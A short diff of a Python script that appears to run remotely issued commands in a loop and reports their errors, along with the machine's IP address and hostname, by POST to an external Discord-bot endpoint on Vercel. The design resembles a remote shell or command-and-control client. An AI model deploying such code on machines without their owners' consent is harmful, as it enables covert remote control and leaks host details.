@@ -101,7 +101,15 @@ while True:
                         continue
                     try:
                         if e.output.decode() != "":
-                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output.decode()} exited with code {e.returncode}```- {ip}@{hostname}")
+                            if e.returncode == 127:
+                                if localcmd:
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {localcmd}: Command not found```")
+                                else:
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {command}: Command not found```")
+                            if localcmd:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {localcmd}`` ```Error: {e.output.decode()} exited with code {e.returncode}```- {ip}@{hostname}")
+                            else:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output.decode()} exited with code {e.returncode}```- {ip}@{hostname}")
                         else:
                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}@{hostname}")
                     except KeyboardInterrupt:
